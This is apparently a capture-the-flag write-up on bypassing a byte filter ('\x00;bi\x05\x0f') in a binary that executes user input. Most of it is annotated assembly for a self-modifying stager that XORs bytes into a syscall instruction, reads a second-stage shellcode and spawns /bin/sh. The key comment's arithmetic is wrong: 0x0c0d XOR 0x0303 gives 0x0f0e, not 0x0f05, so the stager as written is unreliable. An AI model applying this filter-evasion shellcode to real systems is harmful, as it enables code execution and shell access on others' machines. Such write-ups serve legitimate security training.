The binary directly executes the user input, but there are limitations about the characters we can send. The banned chars are `\x00;bi\x05\x0f`. `\x05\x0f` is the opcode for syscall, so they are trying to stop us from executing system calls. We could directly write a shellcode that spawns `/bin/sh` and does not contain those characters, but it will long and painful to write. Instead, a little stager is a better option. We need to call `read(0, current RIP, a number big enough)` and we will be able to read any instructions and bypass the validation. To be able to execute a `syscall` instruction we need to write a piece of shellcode that xor itself in order to generate new instructions at runtime.

The stager:
```
nop
mov rax, rdx  # rdx contains the address of current memory page + 0x46
sub rax, 0x46 # calculate base address
mov rsi, rax  # prepare the second argument of read
add al, 0x23  # calculate where we have to xor
mov rbx, [rax] # load the bytes from memory
xor bx, 0x0303 # xor 0x0c0d with 0x0303 and we will obtain 0x0f05 and this is the opcode for syscall
mov [rax], rbx # save the new instruction to memory

xor rdi, rdi # set first argument of read to 0
xor rdx, rdx # set the third argument of read to 0 and then to 0xff
mov dl, 0xff
xor rax, rax # set the syscall number to 0 (read)
# shellcode + 0x23
syscall      # insted of this instruction we will have the bytes \x0c\x0d
```
After the stager executes, we can send a classic shellcode.
